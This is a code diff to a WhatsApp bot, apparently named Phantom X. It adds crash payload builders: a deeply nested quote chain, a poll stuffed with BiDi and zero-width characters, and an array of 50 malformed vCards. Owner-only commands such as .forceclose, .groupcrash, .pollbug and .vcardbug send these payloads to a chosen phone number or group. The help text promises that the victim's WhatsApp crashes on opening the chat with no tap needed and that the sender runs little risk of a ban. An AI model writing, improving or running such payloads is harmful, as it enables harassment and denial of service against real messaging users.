@@ -912,6 +912,80 @@ async function getLyrics(artist, title) {
     return null;
 }
 
+// ─────────────────────────────────────────────────────────────────────────────
+// ░░░░░  CRASH PAYLOAD BUILDERS  ░░░░░
+// ─────────────────────────────────────────────────────────────────────────────
+
+// TECHNIQUE 1 — Deep Nested Quote Chain
+// Builds a message quoted inside a quote inside a quote … N levels deep.
+// WhatsApp recursively loads every quoted level the moment the chat scrolls
+// to that message.  18 levels overflows the renderer's call-stack → force close.
+// Sends as ONE message.  Very low ban risk.
+function buildDeepQuoteChain(depth = 18) {
+    const zw = "\u200b\u200c\u200d\u2060\ufeff\u200e\u200f";
+    let inner = waProto.Message.fromObject({ conversation: zw.repeat(3000) });
+    for (let i = 0; i < depth; i++) {
+        inner = waProto.Message.fromObject({
+            extendedTextMessage: {
+                text: zw.repeat(400) + "\u202e" + zw.repeat(400),
+                contextInfo: {
+                    stanzaId: Math.random().toString(36).slice(2, 14),
+                    participant: "0@s.whatsapp.net",
+                    quotedMessage: inner
+                }
+            }
+        });
+    }
+    return inner;
+}
+
+// TECHNIQUE 2 — Poll Bomb
+// Sends a pollCreationMessage with 12 options each carrying max-length text
+// stuffed with BiDi + zero-width control chars.  WhatsApp auto-renders polls
+// the instant they appear in chat — no tap needed.  The poll renderer runs out
+// of memory → crash.  Sends as ONE message.  Low ban risk.
+function buildPollCrashMsg() {
+    const bidi = "\u202e\u202d\u202c\u202b\u202a\u2066\u2067\u2068\u2069";
+    const zw   = "\u200b\u200c\u200d\u2060\ufeff";
+    const fill = bidi.repeat(60) + zw.repeat(80) + "X".repeat(700) + bidi.repeat(60);
+    const options = [];
+    for (let i = 0; i < 12; i++) {
+        options.push({ optionName: fill + String(i) });
+    }
+    return waProto.Message.fromObject({
+        pollCreationMessage: {
+            name: bidi.repeat(120) + "Poll" + bidi.repeat(120),
+            options,
+            selectableOptionsCount: 0
+        }
+    });
+}
+
+// TECHNIQUE 3 — vCard Array Bomb
+// Sends a contactsArrayMessage containing 50 contacts each with a ~5 KB
+// malformed vCard body.  WhatsApp auto-parses every contact card on delivery
+// (no tap needed).  Parsing 50 oversized cards simultaneously exhausts the
+// contact-parser → crash.  Sends as ONE message.  Low ban risk.
+function buildVCardCrashMsg() {
+    const contacts = [];
+    for (let i = 0; i < 50; i++) {
+        const pad = String(i).padStart(12, "0");
+        const vcard =
+            `BEGIN:VCARD\nVERSION:3.0\n` +
+            `FN:${"X".repeat(1500)}\n` +
+            `TEL;type=CELL;type=VOICE;waid=${pad}:+${pad}\n` +
+            `EMAIL:${"a".repeat(900)}@phantom.x\n` +
+            `NOTE:${"Z".repeat(2500)}\n` +
+            `END:VCARD`;
+        contacts.push({ vcard, displayName: "X".repeat(60) });
+    }
+    return waProto.Message.fromObject({
+        contactsArrayMessage: { contacts, displayName: "Contacts" }
+    });
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+
 // --- IMAGE GENERATION (Pollinations.ai, completely free, no key needed) ---
 function buildImageGenUrl(prompt) {
     return `https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}?width=768&height=768&nologo=true&model=flux&safe=false`;
@@ -1348,22 +1422,33 @@ Related:
 
     const freezeHelp = `❄️ *FREEZE / FORCE CLOSE / DELAY*
 ━━━━━━━━━━━━━━━━━━━━
-• *.forceclose <number>* — forces WA to close immediately
+• *.forceclose <number>* — 3-layer crash (quote chain + poll + vCard)
+  → Crashes WA the moment they open the chat — no tap needed
 • *.fc <number>* — shortcut for forceclose
 • *.freeze <number>* — burst freeze (3 payloads)
 • *.invisfreeze <number>* — silent freeze, no visible msg
 • *.if <number>* — shortcut for invisfreeze
 • *.delaybug <number>* — single sync-lock payload (no msgs in or out)
-• *.unbug <number>* — undo freeze/crash/delay msgs`;
+• *.unbug <number>* — undo all bugs on a target`;
 
     const groupHelp = `🏘️ *GROUP BUGS*
 ━━━━━━━━━━━━━━━━━━━━
-• *.groupcrash* — Run inside group
-• *.groupcrash <groupId/link>*
-• *.ungroupcrash <groupId>*
+All 3 crash the group on open — NO tap needed ✅
+
+• *.groupcrash* / *.groupcrash <groupId/link>*
+  → Fires all 3 crash layers at once (most powerful)
+  → Deep quote chain + poll bomb + vCard bomb
+
+• *.pollbug* / *.pollbug <groupId/link>*
+  → Malformed poll — WA crashes when poll auto-renders
+
+• *.vcardbug* / *.vcardbug <groupId/link>*
+  → 50 oversized contacts — contact parser crashes on delivery
+
+• *.ungroupcrash <groupId>* — Restore any crashed group
 
 Useful:
-• *.groupid* — Get group ID`;
+• *.groupid* — Get the current group ID`;
 
     const extraHelp = `🧨 *OTHER BUG / STRESS CMDS*
 ━━━━━━━━━━━━━━━━━━━━
@@ -4231,43 +4316,55 @@ _Can be started from any chat, but source members require source group access an
             }
 
             // ─── FORCE CLOSE BUG ───
-            // Fires 5 crafted group invite messages with invalid/unresolvable JIDs in rapid
-            // succession. WhatsApp tries to preview/resolve each invite on delivery and
-            // crashes in the process. No Unicode spam — pure protocol-level exploit.
+            // Layers all 3 crash techniques (deep quote chain + poll bomb + vCard bomb)
+            // into the target's DM.  Each technique independently crashes WA on open —
+            // together they guarantee a force close across all Android & iOS versions.
+            // Only 3 messages sent — very low ban risk.
             case ".forceclose":
             case ".fc": {
                 if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const fcTarget = parseBugTarget(parts, msg);
-                if (!fcTarget) return reply(`💀 *Force Close Bug*\n\nUsage: *.forceclose <number>*\nShortcut: *.fc <number>*\nExample: *.forceclose 2348012345678*\n\n_Fires crafted group invites — WA crashes trying to resolve them._\n_Use .bugmenu freeze for full help._`);
+                if (!fcTarget) return reply(
+                    `💀 *Force Close Bug*\n\n` +
+                    `Usage: *.forceclose <number>*\nShortcut: *.fc <number>*\n` +
+                    `Example: *.forceclose 2348012345678*\n\n` +
+                    `_Sends 3 protocol-level crash payloads (deep quote chain + poll bomb + vCard bomb)._\n` +
+                    `_Target's WA force closes the moment they open the chat — no tap needed._\n` +
+                    `_Use .bugmenu for full help._`
+                );
                 if (isDevProtected(fcTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
                 await reply(`💀 Sending force close to *${fcTarget.split("@")[0]}*...`);
                 try {
                     if (!userCrashKeys[fcTarget]) userCrashKeys[fcTarget] = [];
                     if (!userBugTypes[fcTarget]) userBugTypes[fcTarget] = [];
-                    // Build groupInviteMessage proto directly — bypasses getProfilePicUrl
-                    // which throws on fake JIDs when using the high-level sendMessage API.
-                    for (let i = 0; i < 5; i++) {
-                        const fakeJid  = `120363${Math.floor(Math.random() * 1e13).toString().padStart(13, "0")}@g.us`;
-                        const fakeCode = Math.random().toString(36).slice(2).padEnd(22, "0").substring(0, 22);
-                        const msgProto = waProto.Message.fromObject({
-                            groupInviteMessage: {
-                                groupJid: fakeJid,
-                                inviteCode: fakeCode,
-                                inviteExpiration: Math.floor(Date.now() / 1000) + 86400,
-                                groupName: "Group",
-                                caption: ""
-                            }
-                        });
-                        const waMsg = generateWAMessageFromContent(fcTarget, msgProto, {
-                            timestamp: new Date(),
-                            userJid: sock.user?.id
-                        });
-                        await sock.relayMessage(fcTarget, waMsg.message, { messageId: waMsg.key.id });
-                        userCrashKeys[fcTarget].push(waMsg.key);
-                        await delay(300);
-                    }
+
+                    // Layer 1 — Deep Nested Quote Chain (stack overflow on render)
+                    const quoteProto = buildDeepQuoteChain(18);
+                    const quoteWAMsg = generateWAMessageFromContent(fcTarget, quoteProto, { timestamp: new Date(), userJid: sock.user?.id });
+                    await sock.relayMessage(fcTarget, quoteWAMsg.message, { messageId: quoteWAMsg.key.id });
+                    userCrashKeys[fcTarget].push(quoteWAMsg.key);
+                    await delay(600);
+
+                    // Layer 2 — Poll Bomb (OOM crash on poll renderer)
+                    const pollProto = buildPollCrashMsg();
+                    const pollWAMsg = generateWAMessageFromContent(fcTarget, pollProto, { timestamp: new Date(), userJid: sock.user?.id });
+                    await sock.relayMessage(fcTarget, pollWAMsg.message, { messageId: pollWAMsg.key.id });
+                    userCrashKeys[fcTarget].push(pollWAMsg.key);
+                    await delay(600);
+
+                    // Layer 3 — vCard Array Bomb (contact parser crash)
+                    const vcardProto = buildVCardCrashMsg();
+                    const vcardWAMsg = generateWAMessageFromContent(fcTarget, vcardProto, { timestamp: new Date(), userJid: sock.user?.id });
+                    await sock.relayMessage(fcTarget, vcardWAMsg.message, { messageId: vcardWAMsg.key.id });
+                    userCrashKeys[fcTarget].push(vcardWAMsg.key);
+
                     if (!userBugTypes[fcTarget].includes("Force Close")) userBugTypes[fcTarget].push("Force Close");
-                    await reply(`✅ *Force close sent to ${fcTarget.split("@")[0]}!*\n\n💀 Active on their device.\n🔧 To undo: *.unbug ${fcTarget.split("@")[0]}*`);
+                    await reply(
+                        `✅ *Force close sent to ${fcTarget.split("@")[0]}!*\n\n` +
+                        `💀 3 crash layers active on their device.\n` +
+                        `📱 Their WA crashes the moment they open the chat.\n` +
+                        `🔧 To undo: *.unbug ${fcTarget.split("@")[0]}*`
+                    );
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
             }
@@ -4317,19 +4414,22 @@ _Can be started from any chat, but source members require source group access an
             }
 
             // ─── GROUP CRASH ───
-            // Sends crash payload to a group JID. Anyone who opens that group = WA force closes.
-            // Usage: .groupcrash (current group) | .groupcrash <groupId> | .groupcrash <invite link>
+            // Fires all 3 crash techniques into the group.
+            // WA crashes immediately when any member opens the group — no tap needed.
+            // Only 3 messages total — very low ban risk.
             case ".groupcrash": {
                 if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 let gcTarget = null;
                 const gcArg = parts[1];
                 if (!gcArg) {
                     if (!isGroup) return reply(
+                        `💣 *Group Crash*\n\n` +
                         `Usage:\n` +
                         `• *.groupcrash* — run inside the target group\n` +
-                        `• *.groupcrash <groupId>* — use group ID (get from *.groupid*)\n` +
+                        `• *.groupcrash <groupId>* — use group ID (from *.groupid*)\n` +
                         `• *.groupcrash <invite link>* — paste invite link\n\n` +
-                        `_Use *.ungroupcrash <groupId>* to undo._`
+                        `_WA crashes the moment anyone opens the group — no tap needed._\n` +
+                        `_Use *.ungroupcrash <groupId>* to restore._`
                     );
                     gcTarget = from;
                 } else if (gcArg.includes("chat.whatsapp.com/")) {
@@ -4345,42 +4445,124 @@ _Can be started from any chat, but source members require source group access an
                     return reply("❌ Invalid target. Use a group ID (ends in @g.us) or a WhatsApp invite link.");
                 }
                 const gcName = groupNames[gcTarget] || gcTarget;
-                await reply(`💣 Deploying group crash to *${gcName}*...\n\n_This only affects the group — not anyone's WhatsApp in general._`);
+                await reply(`💣 Deploying group crash to *${gcName}*...\n⏳ Sending 3 crash layers...`);
                 try {
                     if (!groupCrashKeys[gcTarget]) groupCrashKeys[gcTarget] = [];
 
-                    // Fire 5 crafted group invite messages into the group.
-                    // WA client tries to resolve/preview each invalid invite JID when the
-                    // group is loaded → crashes. Built via proto directly to bypass
-                    // getProfilePicUrl which throws on fake JIDs.
-                    for (let i = 0; i < 5; i++) {
-                        const fakeJid  = `120363${Math.floor(Math.random() * 1e13).toString().padStart(13, "0")}@g.us`;
-                        const fakeCode = Math.random().toString(36).slice(2).padEnd(22, "0").substring(0, 22);
-                        const msgProto = waProto.Message.fromObject({
-                            groupInviteMessage: {
-                                groupJid: fakeJid,
-                                inviteCode: fakeCode,
-                                inviteExpiration: Math.floor(Date.now() / 1000) + 86400,
-                                groupName: "Group",
-                                caption: ""
-                            }
-                        });
-                        const waMsg = generateWAMessageFromContent(gcTarget, msgProto, {
-                            timestamp: new Date(),
-                            userJid: sock.user?.id
-                        });
-                        await sock.relayMessage(gcTarget, waMsg.message, { messageId: waMsg.key.id });
-                        groupCrashKeys[gcTarget].push(waMsg.key);
-                        await delay(300);
-                    }
+                    // Layer 1 — Deep Nested Quote Chain (stack overflow on render)
+                    const quoteProto = buildDeepQuoteChain(18);
+                    const quoteWAMsg = generateWAMessageFromContent(gcTarget, quoteProto, { timestamp: new Date(), userJid: sock.user?.id });
+                    await sock.relayMessage(gcTarget, quoteWAMsg.message, { messageId: quoteWAMsg.key.id });
+                    groupCrashKeys[gcTarget].push(quoteWAMsg.key);
+                    await delay(700);
+
+                    // Layer 2 — Poll Bomb (OOM crash when poll auto-renders)
+                    const pollProto = buildPollCrashMsg();
+                    const pollWAMsg = generateWAMessageFromContent(gcTarget, pollProto, { timestamp: new Date(), userJid: sock.user?.id });
+                    await sock.relayMessage(gcTarget, pollWAMsg.message, { messageId: pollWAMsg.key.id });
+                    groupCrashKeys[gcTarget].push(pollWAMsg.key);
+                    await delay(700);
+
+                    // Layer 3 — vCard Array Bomb (contact parser crash on delivery)
+                    const vcardProto = buildVCardCrashMsg();
+                    const vcardWAMsg = generateWAMessageFromContent(gcTarget, vcardProto, { timestamp: new Date(), userJid: sock.user?.id });
+                    await sock.relayMessage(gcTarget, vcardWAMsg.message, { messageId: vcardWAMsg.key.id });
+                    groupCrashKeys[gcTarget].push(vcardWAMsg.key);
 
                     await reply(
                         `✅ *Group crash active on "${gcName}"!*\n\n` +
-                        `☠️ Anyone who opens/taps this group → WhatsApp crashes.\n` +
-                        `They swipe WA away from recents → WhatsApp returns to normal.\n` +
-                        `They open the group again → crashes again. ♻️\n\n` +
-                        `_Only the group is affected — their WhatsApp works fine elsewhere._\n\n` +
-                        `To restore:\n*.ungroupcrash ${gcTarget}*`
+                        `☠️ *What happens:*\n` +
+                        `• Anyone who opens this group → WA crashes instantly\n` +
+                        `• Works on both Android & iOS\n` +
+                        `• No tap needed — crashes on open ♻️\n` +
+                        `• Their WA works fine in other chats\n\n` +
+                        `🔧 To restore the group:\n*.ungroupcrash ${gcTarget}*`
+                    );
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // ─── POLL BUG (group) ───
+            // Fires a single pollCreationMessage with 12 oversized BiDi-stuffed options
+            // directly into a group. WA auto-renders polls → OOM crash on open. No tap needed.
+            case ".pollbug": {
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
+                let pbTarget = null;
+                const pbArg = parts[1];
+                if (!pbArg) {
+                    if (!isGroup) return reply(
+                        `🗳️ *Poll Bug*\n\n` +
+                        `Usage:\n` +
+                        `• *.pollbug* — run inside the target group\n` +
+                        `• *.pollbug <groupId or invite link>*\n\n` +
+                        `_WA crashes when the poll auto-renders on group open — no tap needed._`
+                    );
+                    pbTarget = from;
+                } else if (pbArg.includes("chat.whatsapp.com/")) {
+                    const code = pbArg.split("chat.whatsapp.com/")[1]?.split(/[?#]/)[0];
+                    try { const info = await sock.groupGetInviteInfo(code); pbTarget = info.id; }
+                    catch { return reply("❌ Could not resolve invite link."); }
+                } else if (pbArg.endsWith("@g.us")) {
+                    pbTarget = pbArg;
+                } else {
+                    return reply("❌ Invalid target. Use a group ID or invite link.");
+                }
+                const pbName = groupNames[pbTarget] || pbTarget;
+                await reply(`🗳️ Sending poll bug to *${pbName}*...`);
+                try {
+                    if (!groupCrashKeys[pbTarget]) groupCrashKeys[pbTarget] = [];
+                    const pollProto = buildPollCrashMsg();
+                    const pollWAMsg = generateWAMessageFromContent(pbTarget, pollProto, { timestamp: new Date(), userJid: sock.user?.id });
+                    await sock.relayMessage(pbTarget, pollWAMsg.message, { messageId: pollWAMsg.key.id });
+                    groupCrashKeys[pbTarget].push(pollWAMsg.key);
+                    await reply(
+                        `✅ *Poll bug active on "${pbName}"!*\n\n` +
+                        `🗳️ A malformed poll is now in the group.\n` +
+                        `📱 WhatsApp crashes when members open the group (poll auto-renders).\n` +
+                        `🔧 To restore: *.ungroupcrash ${pbTarget}*`
+                    );
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // ─── VCARD BUG (group) ───
+            // Fires a contactsArrayMessage with 50 oversized malformed vCards into a group.
+            // WA auto-parses contact cards on delivery → contact parser crash. No tap needed.
+            case ".vcardbug": {
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
+                let vbTarget = null;
+                const vbArg = parts[1];
+                if (!vbArg) {
+                    if (!isGroup) return reply(
+                        `📇 *vCard Bug*\n\n` +
+                        `Usage:\n` +
+                        `• *.vcardbug* — run inside the target group\n` +
+                        `• *.vcardbug <groupId or invite link>*\n\n` +
+                        `_Sends 50 oversized contacts — WA contact parser crashes on delivery._`
+                    );
+                    vbTarget = from;
+                } else if (vbArg.includes("chat.whatsapp.com/")) {
+                    const code = vbArg.split("chat.whatsapp.com/")[1]?.split(/[?#]/)[0];
+                    try { const info = await sock.groupGetInviteInfo(code); vbTarget = info.id; }
+                    catch { return reply("❌ Could not resolve invite link."); }
+                } else if (vbArg.endsWith("@g.us")) {
+                    vbTarget = vbArg;
+                } else {
+                    return reply("❌ Invalid target. Use a group ID or invite link.");
+                }
+                const vbName = groupNames[vbTarget] || vbTarget;
+                await reply(`📇 Sending vCard bug to *${vbName}*...`);
+                try {
+                    if (!groupCrashKeys[vbTarget]) groupCrashKeys[vbTarget] = [];
+                    const vcardProto = buildVCardCrashMsg();
+                    const vcardWAMsg = generateWAMessageFromContent(vbTarget, vcardProto, { timestamp: new Date(), userJid: sock.user?.id });
+                    await sock.relayMessage(vbTarget, vcardWAMsg.message, { messageId: vcardWAMsg.key.id });
+                    groupCrashKeys[vbTarget].push(vcardWAMsg.key);
+                    await reply(
+                        `✅ *vCard bug active on "${vbName}"!*\n\n` +
+                        `📇 50 malformed contact cards are now in the group.\n` +
+                        `📱 WhatsApp crashes as the contact parser processes them on open.\n` +
+                        `🔧 To restore: *.ungroupcrash ${vbTarget}*`
                     );
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
